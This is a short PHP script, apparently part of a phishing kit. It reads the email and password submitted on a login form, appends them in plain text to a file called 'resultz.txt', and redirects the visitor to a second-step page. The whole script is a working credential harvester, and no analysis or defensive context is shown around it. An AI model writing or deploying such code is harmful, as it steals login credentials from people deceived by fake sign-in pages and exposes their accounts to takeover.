<?php
$email = $_POST['email'];
$password = $_POST['password'];
if (empty($email) && empty($password)) {
  header('location: ./');
} else {
$message = "
Login : ".$email."
Password : ".$password."
";
$qq = fopen("resultz.txt", "a");
fwrite($qq, $message);
fclose($qq);
header('location: steptwo.php');
}
?>
